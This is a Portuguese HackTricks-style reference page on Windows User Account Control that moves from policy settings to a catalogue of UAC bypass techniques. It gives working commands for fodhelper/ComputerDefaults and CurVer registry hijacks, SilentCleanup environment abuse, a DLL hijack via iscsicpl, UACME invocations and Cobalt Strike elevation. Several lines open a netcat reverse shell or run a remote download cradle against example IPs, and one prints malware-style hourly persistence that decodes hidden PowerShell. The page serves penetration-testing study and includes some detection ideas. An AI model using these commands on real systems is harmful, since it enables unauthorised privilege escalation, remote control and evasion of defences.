# UAC - Controle de Conta de Usuário

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que habilita um **aviso de consentimento para atividades com privilégios elevados**. Os aplicativos têm diferentes níveis de `integrity`, e um programa com **nível alto** pode realizar tarefas que **poderiam comprometer o sistema**. Quando o UAC está habilitado, os aplicativos e as tarefas sempre **são executados no contexto de segurança de uma conta não administradora**, a menos que um administrador autorize explicitamente esses aplicativos/tarefas a ter acesso de administrador ao sistema. É um recurso de conveniência que protege os administradores contra alterações não intencionais, mas não é considerado um limite de segurança.<sup>[[2]](#references)</sup>

Para obter mais informações sobre níveis de integridade:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando o UAC está habilitado, um usuário administrador recebe 2 tokens: um token de usuário padrão, para realizar ações comuns com integridade média, e outro com privilégios de administrador.

Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explica em detalhes como o UAC funciona e inclui o processo de logon, a experiência do usuário e a arquitetura do UAC.<sup>[[2]](#references)</sup> Os administradores podem usar políticas de segurança para configurar o funcionamento do UAC de acordo com a organização localmente (usando secpol.msc) ou configurar e distribuir as políticas por meio de Group Policy Objects (GPO) em um ambiente de domínio do Active Directory. As várias configurações são explicadas em detalhes [aqui](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Há 10 configurações de Group Policy que podem ser definidas para o UAC. A tabela a seguir fornece mais detalhes:

| Configuração de Group Policy                                                                                                                                                                                                                                                                                                                                                           | Chave do Registro                | Configuração Padrão                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Modo de Aprovação de Administrador para a conta de Administrador interna](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Desabilitado)                                             |
| [User Account Control: Comportamento do aviso de elevação para administradores no Modo de Aprovação de Administrador](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Solicitar consentimento para binários que não são do Windows na área de trabalho segura) |
| [User Account Control: Comportamento do aviso de elevação para usuários padrão](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Solicitar credenciais na área de trabalho segura)         |
| [User Account Control: Detectar instalações de aplicativos e solicitar elevação](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Habilitado; desabilitado por padrão na edição Enterprise)           |
| [User Account Control: Elevar somente executáveis assinados e validados](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Desabilitado)                                             |
| [User Account Control: Elevar somente aplicativos UIAccess instalados em locais seguros](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Habilitado)                                              |
| [User Account Control: Executar todos os administradores no Modo de Aprovação de Administrador](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Habilitado)                                              |
| [User Account Control: Permitir que aplicativos UIAccess solicitem elevação sem usar a área de trabalho segura](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Desabilitado)                                             |
| [User Account Control: Alternar para a área de trabalho segura ao solicitar elevação](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Habilitado)                                              |
| [User Account Control: Virtualizar falhas de gravação em arquivos e no registro para locais por usuário](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Habilitado)                                              |

### Políticas para instalar software no Windows

As **políticas de segurança locais** ("secpol.msc" na maioria dos sistemas) são configuradas por padrão para **impedir que usuários não administradores instalem software**. Isso significa que, mesmo que um usuário não administrador consiga baixar o instalador do seu software, ele não poderá executá-lo sem uma conta de administrador.

### Chaves do Registro para forçar o UAC a solicitar elevação

Como usuário padrão sem direitos de administrador, você pode garantir que a conta "padrão" **seja solicitada a fornecer credenciais pelo UAC** ao tentar realizar determinadas ações. Isso exige modificar algumas **chaves do registro**, para o que são necessárias permissões de administrador, a menos que haja um **UAC bypass** ou que o atacante já esteja conectado como administrador.

Mesmo que o usuário faça parte do grupo **Administradores**, essas alterações forçam o usuário a **inserir novamente as credenciais da conta** para realizar ações administrativas.

**Na prática, isso só é útil quando você já tem um token elevado, um UAC bypass ou uma configuração incorreta que permite alterar essas chaves; caso contrário, a gravação no registro será bloqueada.**

As chaves e entradas do registro que devem ser alteradas são as seguintes (com os valores padrão entre parênteses):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Isso também pode ser feito manualmente por meio da ferramenta Local Security Policy. Depois de alteradas, as operações administrativas solicitam que o usuário insira novamente suas credenciais.

### Observação

**O User Account Control não é um limite de segurança.** Portanto, usuários padrão não podem sair de suas contas e obter direitos de administrador sem um exploit de escalonamento de privilégios local.

### Solicitar 'acesso total ao computador' a um usuário

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### Privilégios do UAC

- O Internet Explorer Protected Mode usa verificações de integridade para impedir que processos com nível de integridade alto (como navegadores da Web) acessem dados com nível de integridade baixo (como os arquivos temporários da Internet). Isso é feito executando o navegador com um token de baixa integridade. Quando o navegador tenta acessar dados armazenados na zona de baixa integridade, o sistema operacional verifica o nível de integridade do processo e permite o acesso de acordo com essa verificação. Esse recurso ajuda a impedir que ataques de execução remota de código acessem dados confidenciais no sistema.
- Quando um usuário faz logon no Windows, o sistema cria um token de acesso que contém uma lista dos privilégios do usuário. Os privilégios são definidos como a combinação dos direitos e das capacidades de um usuário. O token também contém uma lista das credenciais do usuário, usadas para autenticá-lo no computador e nos recursos da rede.

### Autoadminlogon

Para configurar o Windows para fazer logon automático de um usuário específico na inicialização, defina a **chave do Registro `AutoAdminLogon`**. Isso é útil em ambientes de quiosque ou para fins de teste. Use esse recurso apenas em sistemas seguros, pois ele expõe a senha no Registro.

Defina as seguintes chaves usando o Editor do Registro ou `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

Para voltar ao comportamento normal de logon, defina `AutoAdminLogon` como 0.

## UAC bypass

> [!TIP]
> Observe que, se você tiver acesso gráfico à vítima, o UAC bypass é simples: basta clicar em "Yes" quando o prompt do UAC aparecer.

O UAC bypass é necessário na seguinte situação: **o UAC está ativado, seu processo está sendo executado em um contexto de integridade média e seu usuário pertence ao grupo de administradores**.

É importante mencionar que é **muito mais difícil contornar o UAC quando ele está no nível de segurança mais alto (Always) do que em qualquer um dos outros níveis (Default).**

### Triagem rápida a partir de um shell de integridade média

Antes de tentar um bypass, confirme que você está no cenário correto e identifique a versão do sistema para encontrar métodos conhecidos que funcionem:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Notas práticas:
- Se `EnableLUA=0`, você não precisa de um bypass: qualquer token de administrador pode solicitar diretamente alta integridade.
- `ConsentPromptBehaviorAdmin=2` ou `5` é o cenário comum para bypasses de autoelevação/baseados em COM.
- `Always Notify` aumenta a dificuldade, mas ainda assim teste a build exata em vez de presumir que vai falhar: o UACME ainda acompanha alguns métodos `AlwaysNotify compatible` em builds modernas do Windows.<sup>[[3]](#references)</sup>

### UAC desabilitado

Se o UAC já estiver desabilitado (`ConsentPromptBehaviorAdmin` for **`0`**), você poderá **executar um reverse shell com privilégios de administrador** (nível de alta integridade) usando algo como:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + objeto de depuração reutilizável

A interface RPC local do AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` pode criar um processo com a depuração habilitada. Os processos criados com depuração na mesma thread compartilham o objeto de depuração da thread; um evento de criação de depuração fornece um handle de processo com acesso total, mesmo quando o resultado RPC concede apenas acesso limitado. Isso transforma a reutilização de objetos de depuração em uma primitiva de UAC para um membro do grupo Administrators com integridade média.<sup>[[11]](#references)[[12]](#references)</sup>

Uma cadeia prática é:<sup>[[11]](#references)[[12]](#references)</sup>

1. Chame o método RPC local (diretamente ou por meio de `NdrAsyncClientCall`) para criar um processo descartável não elevado com a depuração habilitada.
2. Consulte `ProcessDebugObjectHandle` com `NtQueryInformationProcess`, desanexe-o com `NtRemoveProcessDebug`, mantenha o objeto e encerre o processo descartável.
3. Use a mesma interface RPC para criar um processo confiável com elevação automática e, em seguida, associe o objeto salvo à thread chamadora por meio de `DbgUiSetThreadDebugObject`.
4. Chame `WaitForDebugEvent` e obtenha o handle de processo de `CREATE_PROCESS_DEBUG_EVENT`; duplique-o com `NtDuplicateObject` antes de continuar.
5. Forneça o handle duplicado a `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` e inicie o payload com uma estrutura de informações de inicialização estendida. Isso reutiliza o contexto do processo elevado e também dá ao processo filho uma relação com um processo pai aparentemente confiável.

Procure a sequência curta, não apenas o binário com elevação automática: criação de processo por RPC local do AppInfo, consultas a `ProcessDebugObjectHandle`, desanexação/reanexação do depurador, um evento de criação de depuração imediato, duplicação de handle e um processo filho cujo processo pai registrado não corresponde ao processo que chamou as APIs de criação.<sup>[[12]](#references)</sup>

### UAC "bypass" **muito** básico (acesso total ao sistema de arquivos)

Se você tiver um shell com um usuário que pertence ao grupo Administrators, poderá **montar o compartilhamento C$** via SMB (sistema de arquivos) localmente em um novo disco e terá **acesso a tudo no sistema de arquivos** (até mesmo à pasta pessoal do Administrator).

> [!WARNING]
> **Parece que este truque não funciona mais**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### Bypass de UAC com Cobalt Strike

As técnicas do Cobalt Strike só funcionarão se o UAC não estiver configurado no nível máximo de segurança

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** e **Metasploit** também têm vários módulos para **bypass** do **UAC**.

### Interfaces COM elevadas (`ICMLuaUtil` / `CMSTPLUA`)

Objetos COM autoelevados continuam sendo uma superfície prática do UAC em builds modernos. O `ICMLuaUtil` ainda é listado pelo UACME como funcional nas versões atuais do Windows, e ferramentas ofensivas continuam adaptando o `CMSTPLUA` ao combinar um processo na área de trabalho interativa, execução de 64 bits e, às vezes, disfarce do PEB/processo antes de invocar o COM Elevation Moniker.<sup>[[3]](#references)</sup>

Dicas práticas:
- Prefira um processo de **64 bits** na **sessão interativa** do usuário (normalmente `explorer.exe` ou um processo filho dele).
- Se um shell direto falhar, tente novamente usando uma implementação BOF / UACME em vez de um wrapper ingênuo de `CreateProcess`.
- Espere que a execução do processo filho ocorra em um **processo elevado separado**; muitos BOFs não elevam o beacon atual diretamente.

### KRBUACBypass

Documentação e ferramenta em [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de bypass do UAC

[**UACME**](https://github.com/hfiref0x/UACME) é uma coleção de técnicas de bypass do UAC. Compile-o com Visual Studio ou MSBuild; o build cria vários executáveis (por exemplo, `Source\Akagi\output\x64\Debug\Akagi.exe`), então selecione o método adequado à build do alvo.<sup>[[3]](#references)</sup>\
Tenha cuidado: alguns métodos de bypass iniciam programas ou prompts visíveis que podem alertar o usuário.<sup>[[3]](#references)</sup>

O UACME informa a **versão de build a partir da qual cada técnica começou a funcionar**.<sup>[[3]](#references)</sup> Você pode pesquisar uma técnica que afete suas versões:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Além disso, usando [esta](https://en.wikipedia.org/wiki/Windows_10_version_history) página, você obtém a versão `1607` do Windows a partir das versões de build.

Um fluxo de trabalho prático é primeiro **pontuar o build do host** e só então executar o método correspondente:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` compara rapidamente a build local com seus métodos de UAC conhecidos, o que é útil para descartar PoCs ineficazes rapidamente.<sup>[[4]](#references)</sup>
- `UACME` continua sendo o melhor catálogo público para associar um bypass a uma build específica. A versão 3.7.1 adicionou os métodos 83–85, enquanto a versão anterior voltou a testar os métodos existentes no **Windows 11 25H2**; confira novamente a tabela de métodos e as notas de versão em vez de presumir que uma PoC antiga ainda se aplica sem alterações.<sup>[[3]](#references)[[9]](#references)</sup>

### Cadeias WNF/UIAccess compatíveis com Always Notify (UACME 3.7.1)

`Always Notify` não elimina todos os bypasses de UAC. O UACME 3.7.1 implementa três novos métodos x64 que combinam estado de ambiente/protocolo controlado pelo usuário com o comportamento de uma tarefa agendada elevada ou de UIAccess, e marca todos como `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** redireciona `SystemRoot` para que a tarefa acionada por WNF `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` faça o `taskhostw.exe` elevado carregar lateralmente `unifiedconsent.dll`. O UACME rastreia esse método desde o Windows 10 build 19041.
- **84 — TabTip:** usa a mesma primitiva de variável de ambiente contra o UIAccess `TabTip.exe`, que carrega `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` ou `rsaenh.dll`, dependendo da build, e então pivota a partir do contexto UIAccess de alta integridade resultante. O UACME rastreia esse método desde o Windows 8.1 / Server 2016.
- **85 — Narrator:** sequestra o protocolo `feedback-hub` por usuário, controla o Narrator com `Alt+CapsLock+F` e, em seguida, inicia uma cópia gravável de `osk.exe` que carrega lateralmente `OskSupport.dll`. Isso requer um desktop interativo e é rastreado desde o Windows 10 1809 / Server 2019.

Depois de compilar as unidades de payload e o Akagi conforme documentado pelo UACME, invoque o número do método correspondente (o comando opcional usa `cmd.exe` como padrão):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Os métodos 84 e 85 dependem de UIAccess/interação com a área de trabalho, portanto não espere que funcionem sem alterações a partir da Session 0 ou de um shell de serviço não interativo. Todos os três manipulam o estado do ambiente/protocolo e preparam DLLs; inspecione a implementação e remova esses artefatos após os testes.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

O binário confiável `fodhelper.exe` é autoelevado nas versões modernas do Windows. Quando iniciado, ele consulta o caminho de registro por usuário abaixo sem validar o verbo `DelegateExecute`. Inserir um comando nesse local permite que um processo de Medium Integrity (o usuário pertence ao grupo Administrators) inicie um processo de High Integrity sem um prompt do UAC.

Caminho do registro consultado por fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>Etapas do PowerShell (configure seu payload e, em seguida, acione-o)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Notas:
- Funciona quando o usuário atual é membro de Administrators e o nível do UAC é padrão/leniente (não Always Notify com restrições adicionais).
- Use o caminho `sysnative` para iniciar um PowerShell de 64 bits a partir de um processo de 32 bits no Windows de 64 bits.
- O payload pode ser qualquer comando (PowerShell, cmd ou um caminho de EXE). Evite interfaces que solicitem confirmação para manter a discrição.

#### Gatilho `ComputerDefaults.exe` para o mesmo handler `ms-settings`

`ComputerDefaults.exe` resolve a mesma associação por usuário `ms-settings\Shell\Open\command` que `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Depois de definir o comando padrão e o valor `DelegateExecute` vazio acima, use `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` como gatilho alternativo; não repita a configuração do registro.<sup>[[13]](#references)[[14]](#references)</sup> Os pré-requisitos de administrador com integridade média e a política do UAC mencionados acima nas notas sobre `fodhelper.exe` ainda se aplicam.<sup>[[2]](#references)[[3]](#references)</sup> O UACME cataloga esse gatilho a partir do Windows 10 RS4 (build 17134), portanto, verifique-o na build de destino.<sup>[[3]](#references)</sup>

#### Variante de sequestro CurVer/extensão (somente HKCU)

Amostras recentes que abusam de `fodhelper.exe` evitam `DelegateExecute` e, em vez disso, **redirecionam o ProgID `ms-settings`** por meio do valor `CurVer` por usuário. O binário autoelevado ainda resolve o handler em `HKCU`, portanto, não é necessário um token de administrador para criar as chaves:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Depois de obter privilégios elevados, o malware geralmente **desativa prompts futuros** definindo `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` como `0` e, em seguida, realiza outras ações de evasão de defesas (por exemplo, `Add-MpPreference -ExclusionPath C:\ProgramData`) e recria a persistência para executar com alta integridade. Uma tarefa de persistência típica armazena no disco um **script PowerShell criptografado com XOR** e o decodifica/executa na memória a cada hora:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Esta variante ainda limpa o dropper e deixa apenas os payloads preparados, fazendo com que a detecção dependa do monitoramento do **sequestro de `CurVer`**, da adulteração de `ConsentPromptBehaviorAdmin`, da criação de exclusões no Defender ou de tarefas agendadas que descriptografam PowerShell na memória.<sup>[[5]](#references)</sup>

### Bypass de UAC pela tarefa `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` inicia `cleanmgr.exe` com privilégios máximos e expande `%windir%` a partir do ambiente do usuário. Se você controlar `HKCU\Environment\windir`, poderá redirecionar essa expansão para um comando arbitrário e obter alta integridade sem uma caixa de diálogo de consentimento.<sup>[[8]](#references)</sup> Ainda vale a pena testar esse método em builds recentes, pois o UACME mantém a técnica ativa e o rastreamento recente de problemas indica que o Windows 11 24H2 talvez exija apenas pequenos ajustes nas aspas.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Se a tarefa citar o caminho nessa build, tente novamente com o payload terminando em aspas (por exemplo, `cmd.exe"`). Sempre limpe `HKCU\Environment\windir` após os testes.

#### Mais UAC bypass

Muitos UAC bypasses clássicos que abusam de fluxos de UI, objetos COM ou interação com a área de trabalho exigem uma **sessão interativa completa** com a vítima; um shell comum de `nc.exe` ou um serviço em **Session 0** geralmente não é suficiente.

Muitas vezes, você pode resolver isso usando uma sessão **meterpreter**. Migre para um **processo** cujo valor de **Session** seja igual a **1**:

![Aponte ms-settings para uma extensão personalizada (.thm) e associe essa extensão ao nosso payload - Mais UAC bypass: Você pode fazer isso usando uma sessão meterpreter. Migre para um processo cujo valor de Session...](<../../images/image (863).png>)

(_explorer.exe_ deve funcionar)

### UAC Bypass com GUI

Se você tiver acesso a uma **GUI, basta aceitar o prompt do UAC** quando ele aparecer; você não precisa realmente de um bypass técnico. Portanto, obter uma sessão GUI costuma ser suficiente para contornar o atrito prático adicionado pelo UAC.

Além disso, se você conseguir uma sessão GUI que alguém estava usando (possivelmente via RDP), haverá **algumas ferramentas em execução como administrador** a partir das quais você poderá, por exemplo, **executar** um **cmd** diretamente **como admin**, sem que o UAC solicite confirmação novamente, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Isso pode ser um pouco mais **stealthy**.

### UAC bypass por brute force com muito ruído

Se o ruído for aceitável, uma ferramenta como [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) pode solicitar elevação repetidamente até que o usuário aceite.

### Seu próprio bypass - Metodologia básica de UAC bypass

Se você observar o **UACME**, verá que **muitos UAC bypasses abusam de DLL hijacking** (geralmente fazendo com que um binário elevado carregue uma DLL controlada pelo atacante de um caminho gravável). [Leia isto para saber como encontrar uma vulnerabilidade de DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Encontre um binário que faça **autoelevate** (verifique se, ao ser executado, ele roda em um nível de integridade alto).
2. Com o procmon, encontre eventos "**NAME NOT FOUND**" que possam ser vulneráveis a **DLL Hijacking**.
3. Você provavelmente precisará **gravar** a DLL em algum **caminho protegido** (como C:\Windows\System32), onde você não tem permissões de gravação. Você pode contornar isso usando:
   1. **wusa.exe**: Windows 7, 8 e 8.1. Ele permite extrair o conteúdo de um arquivo CAB em caminhos protegidos (porque essa ferramenta é executada em um nível de integridade alto).
   2. **IFileOperation**: Windows 10.
4. Prepare um **script** para copiar sua DLL para o caminho protegido e executar o binário vulnerável com autoelevação.

### Outra técnica de UAC bypass

Consiste em observar se um **binário com autoelevação** tenta **ler** do **registro** o **nome/caminho** de um **binário** ou **comando** a ser **executado** (isso é mais interessante se o binário procurar essa informação em **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + DLL hijack pelo `PATH` do usuário

O `C:\Windows\SysWOW64\iscsicpl.exe` de 32 bits é um binário com **autoelevação** que pode ser abusado para carregar `iscsiexe.dll` pela ordem de pesquisa. Se você puder colocar um `iscsiexe.dll` malicioso em uma pasta **gravável pelo usuário** e modificar o `PATH` do usuário atual (por exemplo, via `HKCU\Environment\Path`) para que essa pasta seja pesquisada, o Windows poderá carregar a DLL do atacante no processo elevado `iscsicpl.exe` **sem exibir um prompt do UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Notas práticas:
- Isso é útil quando o usuário atual pertence a **Administrators**, mas está executando com **Medium Integrity** devido ao UAC.
- A cópia em **SysWOW64** é a relevante para esse bypass. Trate a cópia em **System32** como um binário separado e valide seu comportamento independentemente.
- A primitiva combina **autoelevação** e **DLL search-order hijacking**; portanto, o mesmo fluxo de trabalho com ProcMon usado para outros UAC bypasses é útil para validar o carregamento da DLL ausente.

Fluxo mínimo:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Ideias de detecção:
- Gere um alerta para `reg add` / gravações no registro em `HKCU\Environment\Path` seguidas imediatamente pela execução de `C:\Windows\SysWOW64\iscsicpl.exe`.
- Procure por `iscsiexe.dll` em locais **controlados pelo usuário**, como `%TEMP%` ou `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlacione a execução de `iscsicpl.exe` com processos filho inesperados ou carregamentos de DLLs fora dos diretórios normais do Windows.

### Pesquisas mais recentes que vale a pena verificar separadamente

Algumas cadeias pós-2024 já não se parecem com os clássicos hijacks do registro em `HKCU\Software\Classes`. Por exemplo, o envenenamento do cache de contexto de ativação pode encadear um **remapeamento de unidade** e **redirecionamento de DLL** para passar de integridade média para alta por meio de UI confiável / binários autoelevados, como `ctfmon.exe`, e alvos posteriores, como `fodhelper.exe`. Em vez de duplicar aqui o grande PoC, consulte os exemplos compactos de payload em:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack de letra de unidade do Administrator Protection (preview) via mapa de dispositivos DOS por sessão de logon

> [!NOTE]
> Em agosto de 2026, a Microsoft ainda documenta o Administrator Protection como um **preview do Insider**: a implementação de outubro de 2025 foi revertida e está prevista para uma data posterior. Antes de testar essas cadeias, confirme que o **Admin Approval Mode com Administrator protection** está realmente habilitado e que o dispositivo foi reiniciado; apenas uma versão padrão 25H2 não comprova que o recurso está ativo.<sup>[[10]](#references)</sup>

Para conhecer toda a superfície de ataque `RAiLaunchAdminProcess` / UIAccess em builds de preview do Windows 11 25H2, consulte a página dedicada:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

O “Administrator Protection” do Windows 11 25H2 usa tokens shadow-admin com mapas por sessão `\Sessions\0\DosDevices/<LUID>`. O diretório é criado sob demanda por `SeGetTokenDeviceMap` na primeira resolução de `\??`. Se o atacante se passar pelo token shadow-admin apenas no nível **SecurityIdentification**, o diretório será criado com o atacante como **proprietário** (herdado de `CREATOR OWNER`), permitindo links de letra de unidade que têm precedência sobre `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Etapas:**

